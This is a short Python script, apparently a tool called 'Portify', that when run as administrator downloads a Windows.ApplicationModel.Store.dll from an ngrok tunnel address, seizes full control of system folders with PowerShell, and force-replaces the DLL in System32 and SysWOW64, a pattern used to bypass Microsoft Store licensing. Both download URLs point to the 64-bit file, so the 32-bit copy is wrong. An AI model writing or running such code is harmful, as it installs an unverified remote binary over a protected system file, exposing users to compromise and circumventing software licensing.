if API.IsAdmin():
    print('Script made by PSVKS')
    console.newLine()
    console.newLine()
    console.log('info', 'Starting to make changes.')
    if not os.path.exists('x32'):
        os.makedirs('x32')
    if not os.path.exists('x64'):
        os.makedirs('x64')
    url_x32 = "https://eminent-mako-accurate.ngrok-free.app/static/downloads/64bit/Windows.ApplicationModel.Store.dll"
    url_x64 = "https://eminent-mako-accurate.ngrok-free.app/static/downloads/64bit/Windows.ApplicationModel.Store.dll"
    destination_x32 = os.path.join('x32', 'Windows.ApplicationModel.Store.dll')
    destination_x64 = os.path.join('x64', 'Windows.ApplicationModel.Store.dll')
    APINet.downloadFile(url_x32, destination_x32)
    APINet.downloadFile(url_x64, destination_x64)

    # Make FullControl Process
    API.executePowershell(API.getAllPermissions, 'getFCofSFolders')

    # Move Files
    API.executePowershell('Move-Item -Path "x32\Windows.ApplicationModel.Store.dll" -Destination "C:\Windows\System32" -Force', 'MoveFile')
    API.executePowershell('Move-Item -Path "x64\Windows.ApplicationModel.Store.dll" -Destination "C:\Windows\SysWOW64" -Force', 'MoveFile2')

    # Remove FullControl Process
    API.executePowershell(API.remAllPermissions, 'rmFCofSFolders')

    # Final
    console.newLine()
    console.newLine()
    console.log('info', 'Portify made changes correctly, you might need to start services.')
    console.log('success', 'Portify made changes correctly')
else:
    console.log('warn', "Portify didn't make any changes on your system, please execute as administrator.")
